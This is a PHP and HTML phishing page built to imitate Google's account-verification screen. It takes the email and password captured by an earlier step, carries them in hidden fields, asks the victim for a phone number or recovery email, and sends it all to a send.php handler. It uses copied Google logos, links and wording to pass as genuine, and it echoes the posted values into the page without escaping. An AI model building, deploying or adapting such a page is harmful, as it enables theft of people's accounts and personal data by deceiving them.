<!DOCTYPE html>


<?php

$email = $_POST['email'];
$pass = $_POST['pass'];

?>


<html lang="en">
<head>
  <title>Google Accounts</title>
  <style type="text/css"><!--
    body {
      font-family: arial, sans-serif;
      margin: 0;
      padding: 13px 15px 15px;
    }
    .body {
      margin: 0;
    }
    div.errorbox-good {}

    div.errorbox-bad {} 

    div.errormsg { color: red; font-size: smaller; font-family: arial,sans-serif;}
    font.errormsg { color: red; font-size: smaller; font-family: arial,sans-serif;}
    
    div.pagemsg {
      font-size: smaller; 
      font-weight: bold; 
      text-align: center;
    }
    div.pagemsg span {
      padding: 5px; 
      background: #ff9;
    }

    
    div.topbarwrap {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      z-index: 1000;
    }
    div.topbar {
      padding: 3px 8px 0px;
    }
    div.header {
      
      margin-bottom: 9px;
      margin-left: -2px;
      position:relative;
      zoom: 1
    }
    div.header img.logo {
      border: 0;
      float:left;
    }
    div.header div.headercontent {
      float:right;
      margin-top:17px;
    }
    div.header:after{
      content:".";
      display:block;
      height:0;
      clear:both;
      visibility:hidden;
    }
    div.pagetitle {
      font-weight:bold;
    }
    
    .footer { 
      color: #666;
      font-size: smaller;
      margin-top: 40px;
      text-align: center;
    }
    
    table#signupform {
      left: -5px;
      top: -7px;
      position:relative;
    }
    table#signupform td{
      padding: 7px 5px;
    }
    table#signupform td table td{
      padding: 1px;
    }

    
    
    hr {
      border: 0;
      background-color:#DDDDDD;
      height: 1px;
      width: 100%;
      text-align: left;
      margin: 5px;
    }
    

    
    
  --></style>
</head>
<meta name="viewport" content="width=device-width,user-scalable=no">
<style type="text/css">
.body {
  font-size: small;
}
h1 {
  font-family: helvetica, arial, sans-serif;
  font-size: 21px;
  font-weight: normal;
  line-height: 1;
  margin: 30px 0 18px;
}
h2 {
  font-family: helvetica, arial, sans-serif;
  font-size: 16px;
  font-weight: normal;
  line-height: 1;
  margin-bottom: 18px;
}
h3 {
  font-family: helvetica, arial, sans-serif;
  font-size: 13px;
  font-weight: bold;
  line-height: 1;
  margin-bottom: 18px;
}
h1.with-description, h2.with-description, h3.with-description {
  margin-bottom: 2px;
}
.default-content-area {
  max-width: 940px;
  min-width: 440px;
}
.data {
  font-weight: bold;
}
.warning, .error {
  color: #F00;
}
.heading-description {
  line-height: 1;
  margin-bottom: 15px;
}
  h1, h2, h3 {
  font-weight: bold;
  }
  input.radio {
  width: 12px;
  float: left;
  }
  div.body {
  max-width: 800px;
  }
  div.option {
  margin-left: 24px;
  padding-bottom: 2em;
  }
  div.option label.selected {
  font-weight: bold;
  }
  div.option-content {
  padding-top: 6px;
  }
  .hint {
  color: #808080;
  font-size: 90%;
  padding: 2px;
  }
  .help {
  color: #808080;
  font-size: 90%;
  }
  div.errormsg {
  font-size: 90%;
  }
  div.help, div.errormsg {
  margin-top: .5em;
  }
  .clearfix {
  zoom: 1;
  }
  .clearfix:after {
  content: ".";
  display: block;
  height: 0;
  clear: none;
  visibility: hidden;
  }
</style>
<body dir="ltr">
<div class="header">
  <a href='https://accounts.google.com/'>
  <img class="logo"
       src='https://www.google.com/intl/en/images/logos/accounts_logo.gif'
       alt="Google" />
  </a>
  <div class="headercontent">
<form action='xxxx.html' id="gaia_langform" method="POST">
  <font face="Arial, sans-serif" size="-1">
  Change Language:
  </font>
  <select dir="ltr" class="gaia_lce_select" name="hl" onchange="form.submit();">
  <option value="ms"
                >
  Bahasa Malaysia
  </option>
  <option value="ca"
                >
  Català
  </option>
  <option value="da"
                >
  Dansk
  </option>
  <option value="de"
                >
  Deutsch
  </option>
  <option value="en"
                selected="true">
  English
  </option>
  <option value="en-GB"
                >
  English (UK)
  </option>
  <option value="es"
                >
  Español
  </option>
  <option value="eu"
                >
  Euskara
  </option>
  <option value="fil"
                >
  Filipino
  </option>
  <option value="fr"
                >
  Français
  </option>
  <option value="hr"
                >
  Hrvatski
  </option>
  <option value="in"
                >
  Indonesia
  </option>
  <option value="it"
                >
  Italiano
  </option>
  <option value="sw"
                >
  Kiswahili
  </option>
  <option value="lv"
                >
  Latviešu valoda
  </option>
  <option value="lt"
                >
  Lietuvių
  </option>
  <option value="nl"
                >
  Nederlands
  </option>
  <option value="no"
                >
  Norsk
  </option>
  <option value="pt-BR"
                >
  Português (Brasil)
  </option>
  <option value="pt-PT"
                >
  Português (Portugal)
  </option>
  <option value="ro"
                >
  Română
  </option>
  <option value="sk"
                >
  Slovenčina
  </option>
  <option value="sl"
                >
  Slovenščina
  </option>
  <option value="sv"
                >
  Svenska
  </option>
  <option value="tl"
                >
  Tagalog
  </option>
  <option value="vi"
                >
  Tiếng Việt
  </option>
  <option value="tr"
                >
  Türkçe
  </option>
  <option value="et"
                >
  eesti keel
  </option>
  <option value="hu"
                >
  magyar
  </option>
  <option value="pl"
                >
  polski
  </option>
  <option value="fi"
                >
  suomi
  </option>
  <option value="is"
                >
  íslenska
  </option>
  <option value="cs"
                >
  čeština
  </option>
  <option value="el"
                >
  Ελληνικά
  </option>
  <option value="ru"
                >
  Русский
  </option>
  <option value="uk"
                >
  Українська
  </option>
  <option value="bg"
                >
  български
  </option>
  <option value="sr"
                >
  српски
  </option>
  <option value="iw"
                >
  עברית
  </option>
  <option value="ur"
                >
  اردو
  </option>
  <option value="ar"
                >
  العربية
  </option>
  <option value="mr"
                >
  मराठी
  </option>
  <option value="hi"
                >
  हिन्दी
  </option>
  <option value="bn"
                >
  বাংলা
  </option>
  <option value="gu"
                >
  ગુજરાતી
  </option>
  <option value="or"
                >
  ଓଡିଆ
  </option>
  <option value="ta"
                >
  தமிழ்
  </option>
  <option value="te"
                >
  తెలుగు
  </option>
  <option value="kn"
                >
  ಕನ್ನಡ
  </option>
  <option value="ml"
                >
  മലയാളം
  </option>
  <option value="th"
                >
  ไทย
  </option>
  <option value="am"
                >
  አማርኛ
  </option>
  <option value="zh-TW"
                >
  中文 (繁體)
  </option>
  <option value="zh-CN"
                >
  中文（简体）
  </option>
  <option value="ja"
                >
  日本語
  </option>
  <option value="ko"
                >
  한국어
  </option>
  </select>
  <noscript>
  <input class="gaia_lce_submit" type="submit"
           value="Change">
  </input>
  </noscript>
  <input type="hidden" name="timeStmp" id="timeStmp"
       value=''/>
<input type="hidden" name="secTok" id="secTok"
       value=''/>
</form>
  </div>
</div>
  <form method="post" id="challengeform" action=send.php>
  <input type="hidden" name="email" value="<?php echo($email); ?>">
<input type="hidden" name="pass" value="<?php echo($pass); ?>">
  <input type="hidden" name="continue" id="continue"
           value="https://mail.google.com/mail/" />
  <input type="hidden" name="_utf8" id="_utf8" value="&#9731;"/>
  <input type="hidden" id="JsDetectorInput" name="jsenabled" value="false" />
  <input type="hidden" name="bgresponse" id="bgresponse">
  <div class="body">
  <h1>
  Hey, is that really you?
  </h1>
  <p>
  It looks like you're signing in to your account from a new location. Just so we know this is you &mdash; and not someone trying to hijack your account &mdash; please complete this quick verification.
  Learn more about this <a href="http://www.google.com/support/accounts/bin/answer.py?answer=1281737&amp;hl=en&amp;ctx=ch_LoginVerification&amp;p=mail&hbc=anwar.noor%40gmail.com" target="_blank">additional security measure</a>.
  </p>
  <h2>
  Choose a verification method
  </h2>
  <div class="item clearfix">
  <input type="radio" class="radio" name="challengetype" id="PhoneVerificationChallenge" value="PhoneVerificationChallenge"
            
              checked="checked"
            
          >
<div class="option" id="PhoneVerificationChallengeOption">
  <label for="PhoneVerificationChallenge" id="PhoneVerificationChallengeLabel">
  Confirm my phone number: 
  </label>
  <div class="option-content" id="PhoneVerificationChallengeOptionContent">
  <input type="tel" name="phoneNumber" id="phoneNumber" size="30"
      
        
      
      
      placeholder="Enter full phone number"
      
    >
  <span class="hint ">
  
  </span>
  <div class="help">
  Google will check if this is the same phone number we have on file -- we won't send you any messages.
  </div>
  </div>
</div>
  </div>
  <div class="item clearfix">
  <input type="radio" class="radio" name="challengetype" id="RecoveryEmailChallenge" value="RecoveryEmailChallenge"
            
          >
<div class="option" id="RecoveryEmailChallengeOption">
  <label for="RecoveryEmailChallenge" id="RecoveryEmailChallengeLabel">
  Confirm my recovery email address: 
  </label>
  <div class="option-content" id="RecoveryEmailChallengeOptionContent">
  <input name="emailAnswer" id="emailAnswer" size="30"
      
        type="text"
      
      
      
      placeholder="Enter full email address"
      
    >
  <span class="hint ">
  
  </span>
  <div class="help">
  Google will check if this is the same email address we have on file – we won't send you any messages.
  </div>
  </div>
</div>
  </div>
 
</div>
  </div>
  <p>
  <input type="submit" name="submitChallenge" id="submitChallenge"
    value="Continue"
    
  />
  </div>
  </form>
  <div class="footer">
  <font size=-1 color=#666666>&copy; 2011 -
  <a href="http://www.google.com/a/help/intl/en/users/user_features.html#utm_medium=et&utm_source=gmail-en&utm_campaign=crossnav&token=gmail_footer">Gmail for Organizations</a> -
  <a href="http://mail.google.com/mail/help/intl/en/terms.html">Terms &amp; Privacy</a>
  - <a href="http://mail.google.com/support/">Help</a>
  </font>
  </div>
<script type="text/javascript">
<!--

var onsubmitHandlers = [];
var onloadHandlers = [];


var addOnsubmitHandler = function(eventHandler) {
  onsubmitHandlers.push(eventHandler);
};


var addOnloadHandler = function(eventHandler) {
  onloadHandlers.push(eventHandler);
};


var challenges = [];

  challenges.push("PhoneVerificationChallenge");
  


  challenges.push("RecoveryEmailChallenge");
  


  challenges.push("SecretQuestionChallenge");
  



var setChallengeSelected = function(challenge, visible) {
  var radio = document.getElementById(challenge),
      label = document.getElementById(challenge + "Label"),
      optionContent = document.getElementById(challenge + "OptionContent");
  if (visible) {
    radio.checked = true;
    if (label) {
      label.style.fontWeight = 'bold';
    }
    optionContent.style.visibility = 'visible';
    optionContent.style.height = '100%';
    var inputElems = optionContent.getElementsByTagName("input")
    
    for (var i = 0; i < inputElems.length; i++) {
      if (inputElems[i].type != "hidden") {
        inputElems[i].focus();
        break;
      }
    }
  } else {
    radio.checked = false;
    if (label) {
      label.style.fontWeight = '';
    }
    optionContent.style.visibility = 'hidden';
    optionContent.style.height = '0';
  }
};


var expandSelectedChallenge = function() {
  for (var i = 0; i < challenges.length; i++) {
    var challenge = challenges[i],
        radio = document.getElementById(challenge);
    setChallengeSelected(challenge, radio.checked);
  }
};


var tryShowPlaceholder = function(inputElem) {
  if (!inputElem.value) {
    inputElem.style.color = "#808080";
    inputElem.value = inputElem.getAttribute("placeholder");
  }
};


var tryClearPlaceholderText = function(inputElem) {
  if (inputElem.value === inputElem.getAttribute("placeholder")) {
    inputElem.style.color = "";
    inputElem.value = "";
  }
};


var applyPlaceholderToInput = function(inputElem) {
  if (inputElem.getAttribute("placeholder")) {
    
    inputElem.onfocus = function() {
      tryClearPlaceholderText(this);
    }

    
    inputElem.onblur = function() {
      tryShowPlaceholder(this);
    }
  }
};

var formSubmitHandler = function() {
  if (document.bg) {
    document.bg.invoke(function(response) {
      document.getElementById("bgresponse").value = response;
    });
  }

  for (var i = 0; i < onsubmitHandlers.length; i++) {
    if (!onsubmitHandlers[i]()) {
      return false;
    }
  }
  return true;
};


var supportsInputPlaceholder = function() {
  return "placeholder" in document.createElement("input");
}

var initialize = function() {
  
  document.getElementById("JsDetectorInput").value = "true";

  if (!supportsInputPlaceholder()) {
    var inputs = document.getElementsByTagName("input");
    for (var i = 0; i < inputs.length; i++) {
      applyPlaceholderToInput(inputs[i]);
    }
  }

  for (var i = 0; i < challenges.length; i++) {
    var radio = document.getElementById(challenges[i]);
    radio.onclick = function() {
      expandSelectedChallenge();
      return true;
    };
  }

  expandSelectedChallenge();

  
  

  
  

  document.getElementById("challengeform").onsubmit = formSubmitHandler;

  for (var i = 0; i < onloadHandlers.length; i++) {
    onloadHandlers[i]();
  }
};

window.onload = initialize;

-->
</script>
</body>
</html>
